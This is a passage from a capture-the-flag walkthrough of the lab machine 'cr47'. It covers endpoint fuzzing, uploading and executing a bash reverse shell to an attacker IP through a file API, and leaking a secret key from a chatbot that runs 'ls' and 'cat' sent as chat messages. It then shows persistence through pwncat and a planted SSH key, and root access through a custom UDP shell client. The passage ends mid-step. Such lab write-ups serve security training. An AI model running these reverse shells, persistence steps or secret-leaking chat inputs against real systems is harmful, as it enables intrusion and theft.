3x3cut3_scr1pt
d3l3t3_r3c0rd
4p1_t0k3n
upl04d_m3tadata
ch3ck_m3t4d4t4
ch3ck_3rr0r
d0wnl04d_c0nt3nt
3x3cut3_c0d3
d3l3t3_d1r
4ppr0v3_1t3m
upl04d_1nput
ch3ck_0utput
ch3ck
ch3ck1ng
d0wnl04d_l1brary
3x3cut3_l1n3
d3l3t3_d3v1c3
4p1_c0nfig
ch3ck_c0nfig
upl04d_4rch1v3
ch3ck_buck3t
d0wnl04d_r3s0urc3
3x3cut3_funct10n
d3l3t3_l0g
4ppr0v3_s3rv1c3
d0wnl04d
upl04d_r3p0rt
ch3ck_d3t41ls
d0wnl04d_t0k3n
upl04d_t0k3n
3x3cut3_squ4d
d3l3t3_c0nt41n3r
4p1_scr33nsh0t
upl04d_v1d30
d3l3t3_v1d30
ch3ck_r3v13w
d0wnl04d_m3ss4g3
3x3cut3_s3ss10n
d3l3t3_c4ch3
4ppr0v3_p1ctur3
upl04d_pr0f1l3
ch3ck_d1m3ns10n
d0wnl04d_v1rus
3x3cut3_1nt3rpr3t3r
d3l3t3_1m4g3
4p1_scr1pt
upl04d_r3sult
ch3ck_scr33n
d0wnl04d_scr33n
3x3cut3_t1m3r
d3l3t3_v1d30
4ppr0v3_v3rs10n
upl04d_v10l4t10n
ch3ck_v1s10n
d0wnl04d_v3h1cl3
3x3cut3_4ct10n
3x3cut3
d3l3t3_v01c3
4p1_r3p0rt
upl04d_n0t3
d3l3t3
ch3ck_m0d3l
d0wnl04d_m4p
3x3cut3_4pp
d3l3t3_r4c3
4ppr0v3_c0nt4ct
upl04d_r3c0rd
d3l3t3_r3c0rd
ch3ck_pr0xy
d0wnl04d_m0n1t0r
3x3cut3_3xpl0r3r
d3l3t3_c4ptur3
4p1_3d1t0r
upl04d_d4t4
ch3ck_f0rm
d0wnl04d_f1l3
upl04d_f1l3
3x3cut3_f1l3
d3l3t3_f1l3
```

This can also be done through your favorite browser or burp of course.

#### Figuring out `lista.txt`

We know from `original_first_note.txt`, that an API (called `New File Management System` from the ticket name) is running somewhere. We even have an api key for this service.

We also know from `original_second_note.txt` that this `lista` is supposed to be a potential endpoint list.

With these two notes and now our potential endpoints list, we should try to find where this `api` is sitting at!

We can try to fuzz again all around `443`, sadly nothing got out. Maybe it's running on another port altogether ??

#### Working on `4443` a.k.a `New File Management System`

If we look back at `nmap` results for this service:

```
4443/tcp open  ssl/pharos?
| ssl-cert: Subject: commonName=CR/organizationName=Rep\xC3\x83\xC2\xBAblica de Costa Rica/stateOrProvinceName=Lim\xC3\x83\xC2\xB3n/countryName=CR
| Not valid before: 2024-09-25T22:26:24
|_Not valid after:  2034-09-23T22:26:24
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 418 I'm a teapot
|     Server: [*] nmap says 'ssl/pharos?'... really? What a shame I can't tell you what I am :)
|     Date: Sat, 28 Sep 2024 00:37:19 GMT
|     Content-Length: 46
|     Content-Type: text/plain; charset=utf-8
|     You're definitely NOT welcome here friend!
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
```

It seems `nmap` is having a hard time detecting what's running on there. We also get a `Server` header in our response that seems to be for us : `[*] nmap says 'ssl/pharos?'... really? What a shame I can't tell you what I am :)`. The trolling continue after you notice the `HTTP` response code was a `418`... :/ 

The content of the response page seems to be `You're definitely NOT welcome here friend!`. 

Okay, nothing points out to the fact the `API` is served here, but let's check this port through `feroxbuster` and the endpoint list we found:

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ feroxbuster -k --url https://cr47.cr:4443 --wordlist lista.txt                 
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://cr47.cr:4443
 🚀  Threads               │ 50
 📖  Wordlist              │ lista.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
418      GET        1l        7w       46c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
401      GET        2l        1w       14c https://cr47.cr:4443/ch3ck
401      GET        2l        1w       14c https://cr47.cr:4443/d0wnl04d
405      GET        2l        3w       20c https://cr47.cr:4443/upl04d
405      GET        2l        3w       20c https://cr47.cr:4443/d3l3t3
405      GET        2l        3w       20c https://cr47.cr:4443/3x3cut3
200      GET        1l        1w      397c https://cr47.cr:4443/4p1
[####################] - 1s       102/102     0s      found:3       errors:0      
[####################] - 0s       102/102     2217/s  https://cr47.cr:4443/
```

Interesting, we get a bunch of different response, `feroxbuster` is able to detect `418` as the default "error" code. 

We also found more conclusive results:
- `/ch3ck`, `/d0wnl04d` => `Unauthorized`
- `/upl04d`, `/d3l3t3`, `/3x3cut3` => `Method Not Allowed` 
- `/4p1` lastly responded successfuly to our request!

Time to hack this `API`!

#### Making some recon on `NFMS` (`New File Management System`)

As with all `APIs`, our work right now is to find as much information we can on this service so we can exploit it properly !

First step will be, if we can, to find the endpoint serving the "documentation", describing how to properly communicate with all the available endpoints.

For this service, it seems to be fairly easy to find, it appears to be hosted under `/4p1`, since it's the only one responding `200` to our initial request.

We can curl this endpoint like that: `curl -k https://cr47.cr:4443/4p1`. This returns us this `json` block:

```json
{
  "4p1": {
    "method": "GET"
  },
  "upl04d": {
    "method": "POST",
    "apiKeyHeader": "X-API-Key",
    "argument": "file"
  },
  "ch3ck": {
    "method": "GET",
    "apiKeyHeader": "X-API-Key",
    "argument": "file"
  },
  "d0wnl04d": {
    "method": "GET",
    "apiKeyHeader": "X-API-Key",
    "argument": "file"
  },
  "3x3cut3": {
    "method": "POST",
    "apiKeyHeader": "X-Sensitive-API-Key",
    "argument": "file"
  },
  "d3l3t3": {
    "method": "DELETE",
    "apiKeyHeader": "X-API-Key",
    "argument": "file"
  }
}
```

Okay interesting, we just got all the available endpoints for this service. We can now make some guess about what we're dealing with.

To summarize very quickly the schema we just found:

We have 6 endpoints in total: `4p1`, `upl04d`, `ch3ck`, `d0wnl04d`, `3x3cut3`, `d3l3t3`.

Seeing the endpoints name and the name of the project itself (`NFMS`), it seems this REST api is used to do various file operations like:
-  uploading, checking, downloading, executing and deleting file.

We can also sort these endpoints in terms of: `method` used, `apikeyHeader` needed and also if we need to provide an `argument`.

`4p1` is the most straightforward of all since it respond to us through `GET` requests and no api key or argument is needed.

The rest of the endpoints can be sorted in three groups:

- `upl04d`, `3x3cut3` => works with `POST` method

- `ch3ck`, `d0wnl04d` => works with `GET` method

- `d3l3t3` => works with `DELETE` method

All of the endpoints require an api key (outside of `4p1`). It seems to be the same being used for all endpoints **EXCEPT** `3x3cut3`, that use a different header called `X-Sensitive-API-Key` rather than the standard `X-API-Key`.

It also worth mentionning that all endpoints (outside of `4p1`) do require an argument named `file`, probably used to specify the file we want to work with. 

Now that we figured out all these different concepts, let's start the exploitation phase !

#### Exploiting `NFMS`

First stop will be of course to see if the api key we found in `original_first_note.txt` is in fact the key we can use with the `X-API-Key` header. 

To do so, let's find the easiest endpoint after `4p1/`, it seems to be the `ch3ck/` endpoint. 

Multiple reasons made us think that:
- We can use a `GET` request
- It was found out to be `Unauthorized` when we send a request without the API header through `feroxbuster` 
- and finally it's probably the least harmful endpoint outside of `4p1`! 

So first stop let's make sure the api key we have is the right one!

To do so, we're going to initially curl the endpoint without any api key and then produce the same request with the api key like so:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X GET -k https://cr47.cr:4443/ch3ck?file=test.txt
[-] Unauthorized
                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X GET -H "X-API-Key: 7h1515d3f1n1731y4n4p1k3y" -k https://cr47.cr:4443/ch3ck?file=test.txt
[-] File test.txt does not exist in the server
```

GREAT! It ends up being valid ! We can assume that our api key is indeed valid through the `X-API-Key` header.

Now let's follow this plan to gain our foothold:

1) Create a reverse shell, somehow
2) Upload it through `NFMS`
3) Finding a way to get it executed !

Because we're working in a black box context, creating the reverse shell is probably going to be a trial / error type of process. 

Even if we're able to upload our file, because we still don't know the `X-Sensitive-API-Key`, we might not be able to execute it right after.

For now let's focus on building the perfect reverse shell. 

There's a few elements to note about the target before building one:
- The target is probably running on some Linux distro
- Because we upload a file and want to make it executed by the targeted system, we're not fully aware of how the file will actually get executed.
- Because of that, we need to make sure to have a shebang so that our file gets identified correctly by the target system
- Last but not least, we know that probably bash should be on the machine

To summarize, to execute properly our first step, we need to build a bash reverse shell stored in a file, that will have as a header a Shebang specifying how to execute the file.

It will look like that:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ cat revshell 
#!/bin/bash

bash -i >& /dev/tcp/192.168.67.132/8888 0>&1
                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X POST -H "X-API-Key: 7h1515d3f1n1731y4n4p1k3y" -F "file=@revshell" -k https://cr47.cr:4443/upl04d 
[+] File Uploaded Successfully: revshell
```

Nice ! Through `curl` we were able to upload our file, now let's verify it's sitting on the machine with the `ch3ck/` endpoint:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X GET -H "X-API-Key: 7h1515d3f1n1731y4n4p1k3y" -k https://cr47.cr:4443/ch3ck?file=revshell
[+] File revshell exists on the server
```

Okay the file has been successfully uploaded to the server... but how to execute it and trigger our reverse shell ??

We need to find this `X-Sensitive-API-Key`!

To do so, we need to continue to cover the rest of the attack surface until we end up on something...

#### Doing recon on port `8888`

Earlier, `nmap` gave us this result for the port `8888`:

```html
8888/tcp open  ssl/sun-answerbook?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=*/organizationName=Dummy Certificate
| Subject Alternative Name: DNS:*, DNS:*.*
| Not valid before: 2024-09-28T00:27:48
|_Not valid after:  2025-09-28T00:27:48
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.4 Python/3.12.3
|     Date: Sat, 28 Sep 2024 00:37:24 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8663
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>William the AI Chatbot :)</title>
|     <link rel="icon" href="/static/images/favicon.png" type="image/png">
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
|     <style>
|     body {
|     display: flex;
|     flex-direction: column;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     margin: 0;
|     background-color: #1e1e1e; /* Dark background for the whole page */
|     font-family: Arial, sans-serif;
|_    overflow: h
```

It seems after some research that port `8888` is running a `Flask` server. It seems that we're dealing with a chatbot here, named "`William the AI Chatbot :)`".

We can talk with him through the browser but `curl` also work and will be easier in the context of this write-up.

So we started to chat very quickly...

#### Exploiting `William`

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user_message":"hello"}' -k https://cr47.cr:8888/get_response 
Hi there!

┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user_message":"how are you"}' -k https://cr47.cr:8888/get_response
I'm fine, how about you?

┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user_message":"im okay"}' -k https://cr47.cr:8888/get_response
I'm not sure I understand... KD Mac&Cheese cups are AWFUL
```

It's interesting... very quickly you realize you're not talking to a full fledge `LLM` but rather some kind of very simple automated chatbot.

When you're connecting through the browser, the first message `William` is giving you is:

```
William: Hello! I'm William (Alex was already taken—haha!). I’m a chatbot that was trained with sensitive data from the República de Costa Rica. My employer has been great, providing valuable projects that have helped me improve as a chat assistant. Now, I’m here to assist you with any questions or tasks. How can I help you today?
```

So I just try fuzzing around but nothing really happened...

``` bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user_message":"gfopshigogsfkjog;jfdogji"}' -k https://cr47.cr:8888/get_response
I'm not sure I understand... ¿Cómo son las vacaciones en Costa Rica? 

┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user_message":"gkopfsgijpsh9fphsrgt"}' -k https://cr47.cr:8888/get_response
I'm not sure I understand... COKE IS BETTER THAN PEPSI ?!
```

Okay still the same issue, default error answer, with a slight variation of course... haha

But after some time, you notice that the welcome message talk about `William` being trained with "sensitive data from the República de Costa Rica". 

Maybe if we're asking the system about the API we might get something ?

```
┌──(kali㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user_message":"Would you happen to know anything about NFMS?"}' -k https://cr47.cr:8888/get_response                     
I'm not sure I understand... COKE IS BETTER THAN PEPSI ?!                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user_message":"Would you happen to know anything about New File Management System?"}' -k https://cr47.cr:8888/get_response
I'm not sure I understand... KD Mac&Cheese cups are AWFUL                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user_message":"Would you happen to know anything about an API?"}' -k https://cr47.cr:8888/get_response                    
I'm not sure I understand... KD Mac&Cheese cups are AWFUL

┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user_message":"Would you happen to know anything about X-Sensitive-API-Key?"}' -k https://cr47.cr:8888/get_response
Interesting path that you're taking... follow me out and find the truth in the *cat* but don't forget to simply 'ls' this new way that just appeared... :)
```

Amazing ! We're getting somewhere !!

Let's try to just send `ls` to the assistant ??

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user_message":"ls"}' -k https://cr47.cr:8888/get_response
['app.py', 'static', 'note_for_devs.txt', 'templates']
```

Oh wow ! Let's try to see what's in `note_for_devs.txt`, William talked about the `cat` command, maybe we can use it too !

```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"user_message":"cat note_for_devs.txt"}' -k https://cr47.cr:8888/get_response
Hey guys,

We would like to give more data from our projects to William.

One of the most common thing requested internally is the Sensitive API Key we use to execute programs through NFMS.

One of the thing the support team and I have thought about then, will be to give you guys out this key for training purposes, that way it will actually save time on both of our sides.

You'll find right here the X-Sensitive-API-KEY: "7h1515d3f1n1731y453n5171v34p1k3y"

Let me know if that sounds reasonable.

Santiago
```

Bingo ! We just used `William` to leak the `X-Sensitive-API-Key` from some internal note he got somehow !!

#### Back at exploiting `NFMS`

Now that we own the `X-Sensitive-API-Key`, we can use it to execute our reverse shell, but before, let's set up a listener through `pwncat`:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ pwncat -l 8888 --self-inject /bin/bash:192.168.67.132:8443
```

(I'm also using the tool to gain "persistence" through a second reverse shell. I can activate it at any given time by simply listening to the port `8443` on my machine.
So even if I loose the connection with my current program, I can get a foothold back by simply doing `nc -lvnp 8443`!)

Now we can call the `3x3cut3/` endpoint like so:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X POST -H "X-Sensitive-API-Key: 7h1515d3f1n1731y453n5171v34p1k3y" -d "file=revshell" -k https://cr47.cr:4443/3x3cut3

```

We should see our command hang and if we go back to the tab we set up our listener on, we should see a connection back! : 

(**SIDE NOTE**: It's actually possible, because of an error of logic in the code of the API, to submit the regular api key as the `X-Sensitive-API-Key` header and execute your code like so:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X POST -H "X-Sensitive-API-Key: 7h1515d3f1n1731y4n4p1k3y" -d "file=revshell" -k https://cr47.cr:4443/3x3cut3

```
)

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ pwncat -l 8888 --self-inject /bin/bash:192.168.67.132:8443
[PWNCAT CnC] Checking if remote sends greeting...
bash: cannot set terminal process group (1057): Inappropriate ioctl for device
bash: no job control in this shell
scubaman@cr47:~/NFMS$ 
[PWNCAT CnC] Checking if remote sends prefix/suffix to every request...
[PWNCAT CnC] Remote does not send prefix
[PWNCAT CnC] Remote suffix (1 lines):
b'scubaman@cr47:~/NFMS$ '
[PWNCAT CnC] Probing for: which python3
[PWNCAT CnC] Potential path: /usr/bin/python3
[PWNCAT CnC] Found valid Python3 version: 3.12.3
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Creating tmpfile: Unsure - checking otherwise
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Creating tmpfile: '/tmp/tmpv21dvjsx'
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Creating tmpfile: Unsure - checking otherwise
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Creating tmpfile: '/tmp/tmp6uf8ug3j'
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Creating tmpfile: Unsure - checking otherwise
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Creating tmpfile: '/tmp/tmpugdpm99c'
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Creating tmpfile: Unsure - checking otherwise
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Creating tmpfile: '/tmp/tmpv8d2xcsw'
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Uploading: /usr/bin/pwncat -> /tmp/tmpv8d2xcsw (1/1)
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Decoding: /tmp/tmpv8d2xcsw -> /tmp/tmpv21dvjsx
Starting pwncat rev shell: nohup /usr/bin/python3 /tmp/tmpv21dvjsx 192.168.67.132 8443 --exec /bin/bash --reconn --reconn-wait 1 > /tmp/tmp6uf8ug3j 2> /tmp/tmpugdpm99c &
[PWNCAT CnC] Waiting for socket
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Done. Handing over to current shell.
id
id
uid=1001(scubaman) gid=1001(scubaman) groups=1001(scubaman)
scubaman@cr47:~/NFMS$ pwd
pwd
/home/scubaman/NFMS
```

You can also delete your reverse shell file through the endpoint `d3l3t3/` just for clean up purpose since you might do this box with other players:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -X DELETE -H "X-API-Key: 7h1515d3f1n1731y4n4p1k3y" -k https://cr47.cr:4443/d3l3t3?file=revshell 
[+] File revshell deleted successfully
```

**SIDE NOTE**

#### Maintaining access

Now that this was done, let's maintain our access through `ssh` now by doing this:

```bash
scubaman@cr47:~/NFMS$ cd
cd
scubaman@cr47:~$ pwd
pwd
/home/scubaman
scubaman@cr47:~$ ls
ls
NFMS
sss_over_udp
scubaman@cr47:~$ cd .ssh
cd .ssh
bash: cd: .ssh: No such file or directory
scubaman@cr47:~$ mkdir .ssh
mkdir .ssh
scubaman@cr47:~$ cd .ssh
cd .ssh
scubaman@cr47:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIRi2CjickSh2IzxWcG4Sy6SipnzkZygic7XxF12TZg9 kali@kali" >> authorized_keys
<SipnzkZygic7XxF12TZg9 kali@kali" >> authorized_keys
scubaman@cr47:~/.ssh$ cat authorized_keys
cat authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIRi2CjickSh2IzxWcG4Sy6SipnzkZygic7XxF12TZg9 kali@kali
```

Now from our attacker, we should be able to normally `ssh` our way in with the user scubaman like so:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh scubaman@cr47.cr  
The authenticity of host 'cr47.cr (192.168.67.197)' can't be established.
ED25519 key fingerprint is SHA256:JRBmM+Ayiky38qij2OUFHgj0pIvQKL/ngvJEZL5bbC0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cr47.cr' (ED25519) to the list of known hosts.
        ,     \    /      ,        
       / \    )\__/(     / \       
      /   \  (_\  /_)   /   \      
 ____/_____\__\@  @/___/_____\____ 
|             |\../|              |
|              \VV/               |    
|     Per Angusta Ad Augusta      |
|           - r0de0 -             |
|_________________________________|
 |    /\ /      \\       \ /\    | 
 |  /   V        ))       V   \  | 
 |/     `       //        '     \| 
 `              V                '
scubaman@cr47:~$
```

Time to see what's running on there...

### Enumerating the machine

Running `linpeas.sh` didn't seemed to have spit out any conclusive results, now let's look around our new `scubaman` user:

```bash
scubaman@cr47:~$ ls
NFMS  sss_over_udp
scubaman@cr47:~$ cd sss_over_udp/
scubaman@cr47:~/sss_over_udp$ ls
client.py  note_doc.txt  README.md
scubaman@cr47:~/sss_over_udp$ cat note_doc.txt 
Hey, 

We just got the doc from dev team. I created a client file, but I'm not able to understand a thing from the documentation.

Could you help create the client side of this new "protocol" ?
```

Interesting, it seems we might just have discovered a new internal project. It seems to be something where we need to develop the client side ? Let's look at the `README.md`:

```
scubaman@cr47:~/sss_over_udp$ cat README.md 
# Secure Shell Service Over UDP
## Overview
The server listens on `UDP` port `5555` and supports basic shell operations such as connecting, executing commands, and disconnecting. 

It is able to process data up to `2048` bytes. Beyond that, an error message will be returned.

Due to the peculiarities of `UDP`, it is possible that packets are ignored by the server, or that the content of the packet is altered in transit.

The protocol involves sending and receiving packets (on top of `UDP`), each structured with a `header`, `size`, `content`, and `CRC32 checksum`.


## Packet Structure
Each packet consists of the following sections:

1. `Header` (`2` bytes)
    * Message ID: Determines the type of message being sent or received.
2. `Size` (`2` bytes)
    * Indicates the length of the content section.
3. `Content` (up to `2040` bytes)
    * Contains the actual data or command being transmitted.
4. `CRC32` (`4` bytes)
    * A checksum to verify packet integrity, calculated over the header, size, and content.


## Packet Details
* Header Format:
    * The message ID is a `4-digit` decimal number (ranging from `0000` to `9999`) that is converted to a `2-byte` hexadecimal format.
    * You'll have to use big endian when encoding the message ID
* Size Field:
    * This field indicates the length of the content section and is encoded in `2` bytes.
* Content:
    * The content is specific to the type of message. For a `CommandRequest` for example, it's the command to be executed.
* CRC32 Calculation:   
    * The checksum is computed over the header, size, and content using the `CRC32` algorithm.
    * The algorithm used is the same as the one present in Java (`java.util.zip.CRC32`).
    * The checksum is stored on `4` bytes allowing to detect a possible modification of the packet during the transit.
    * Same as the header, you'll have to use big endian when encoding your `CRC32` checksum

## Protocol Details
The protocol is structured as messages. Each message has its own identifier and content. The content of each message will be detailed later in this document.

Each message you send may be answered by an `ErrorMessage` containing an error code. You must check that each message received is not an error message before processing it.

To communicate with this server, it is necessary to follow the following steps in order (You'll receive an `ErrorMessage` if you fail):
1. Sending a `ConnectRequest` message with the string `CONNECT` as content.
2. Next you'll need to send a `CommandRequest` message with the content containing the command as a string (e.g: `ls`).
3. Finally disconnect by sending a `DisconnectRequest` message.

## Message Types
1. ConnectRequest
    * Header: `[*] Try to find it yourself ?!`
    * Content: `CONNECT`

    Server Response:
    * Header: `\x17\x72` (`6002` in hexadecimal -> `ResponseMessage`)
    * Content: `[+] Connection established`
2. CommandRequest
    * Header: `[*] Try to find it yourself ?!`
    * Content: Command to be executed (e.g., `ls -l`)

    Server Response:
    * Header: `\x17\x72` (`6002` in hexadecimal -> `ResponseMessage`)
    * Content: Output of the command execution (e.g., `[+]: file1 file2`)
3. DisconnectRequest
    * Header: `[*] Try to find it yourself ?!`
    * Content: `DISCONNECT` 

    Server Response:
    * Header:  `\x17\x72` (`6002` in hexadecimal -> `ResponseMessage`)
    * Content: `[+] Disconnected`

## Error Handling 
If the server receives an unknown message ID, detects a checksum mismatch, or encounters any other error during processing, it responds with an `ErrorMessage`. 

The server can return an error under the following conditions:
* `Unknown Message ID`: If the header of the received packet does not match any valid message types.
* `Checksum Mismatch`: If the computed `CRC32` checksum does not match the checksum provided in the packet.
* `Invalid Content`: If the content of a command or request is improperly formatted or not recognized.
* `Client State Errors`: If a command is received when the client is not in the `CONNECTED` state (for example, trying to send a command before connecting).

The server's error response will include:
* Header: `\x17\x73` (`6003` in hexadecimal -> `ErrorMessage`)
* Content: A descriptive error message (e.g., `[-] Unknown message ID`, `[-] Checksum mismatch`, or `[-] Invalid command format`, etc...).

## String encoding
Strings are encoded in `UTF-8`.
```

Oh wow, we just got a big piece down our throat, but let's stay focus and try to find if the server side is actually running on the machine...

We can do so by listing all the running processes and piping that into a second command that will filter the input based on the project name (`sss_over_udp`) :

```bash
scubaman@cr47:~/sss_over_udp$ ps aux | grep "sss_over_udp"
root         969  0.0  0.0   2800  1664 ?        Ss   02:01   0:00 /bin/sh -c /usr/bin/python3 /root/sss_over_udp/server.py
root         970  0.0  0.3  19724 12416 ?        S    02:01   0:00 /usr/bin/python3 /root/sss_over_udp/server.py
```

Okay, so we can now be sure that this project is ongoing and more importantly that the `server.py` is being runned by `root`

So coding the client will actually take us exactly where we wanna go, privesc!

## Privilege escalation

#### Doing some recon on `5555`

Looking at the documentation, we can notice that some Header Message ID seems to be missing. Our first stop will be to find the three of them to complete the documentation and then be able to produce a valid client !

One last stop before we start, is looking at the last document we didn't saw in the folder `sss_over_udp`, it's `client.py`:

```python
scubaman@cr47:~/sss_over_udp$ cat client.py 
"""Put list of imported modules just below"""

def client():
    """
    Description:

    Parameters:
        
    Returns:
        
    Note:
    """
    print("[*] You can start to write here or take this file and do it on your machine")


if __name__ == "__main__":
    client()
```

I'm assuming from `client.py` `print()` function call, that the port `5555` is listening on all interface so we should be able to code this back on our attacker machine. Just to make sure this theory is true let's scan the port 5555 from our attacker with `nmap`:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sU -p5555 cr47.cr
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-29 22:26 EDT
Nmap scan report for cr47.cr (192.168.67.197)
Host is up (0.00031s latency).

PORT     STATE SERVICE
5555/udp open  rplay
MAC Address: 00:0C:29:95:3F:BE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

Okay the port is open, let's start to look at the doc and let's code a script to find the three message ids!

#### Doing some recon on `sss_over_udp`

After thorough analysis of the documentation, we were able to produce a script called `brute_header.py` (you can find `brute_header.py` right [here](https://github.com/z0ne323/CR47/blob/main/Walkthrough/sss_over_udp/brute_header.py))

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 brute_header.py
Valid header for ConnectRequest: 0bb9
Valid header for CommandRequest: 0bba
Valid header for DisconnectRequest: 0bbb
All valid headers found: {'ConnectRequest': '0bb9', 'CommandRequest': '0bba', 'DisconnectRequest': '0bbb'}
```

Now that we got all the needed valid headers, we can produce a valid client based on the complete documentation! 

#### Exploiting `sss_over_udp`

As of now, we already coded a few needed function (through `brute_header.py`), mainly to create our custom packets, but we also got the three message ids we needed!

Now, we can create a full fledge `client.py` to execute command as `root`! (you can find `client.py` right [here](https://github.com/z0ne323/CR47/blob/main/Walkthrough/sss_over_udp/client.py))

```
┌──(kali㉿kali)-[~/Desktop/sss_over_udp]
└─$ python3 client.py                                          
[*] Received from server: `[+] Connection established` from ('192.168.67.203', 5555)
[*] Enter command to execute (or 'exit' to disconnect): id
[+] Command response from ('192.168.67.203', 5555): 
uid=0(root) gid=0(root) groups=0(root)
```

Amazing we just proved we were able to achieve code execution as root, let's secure our access by breaching root through `ssh` like so:

```
┌──(kali㉿kali)-[~/Desktop/sss_over_udp]
└─$ python3 client.py
[*] Received from server: `[+] Connection established` from ('192.168.67.203', 5555)
[*] Enter command to execute (or 'exit' to disconnect): ls ~/.ssh/authorized_keys
[+] Command response from ('192.168.67.203', 5555): 
/root/.ssh/authorized_keys
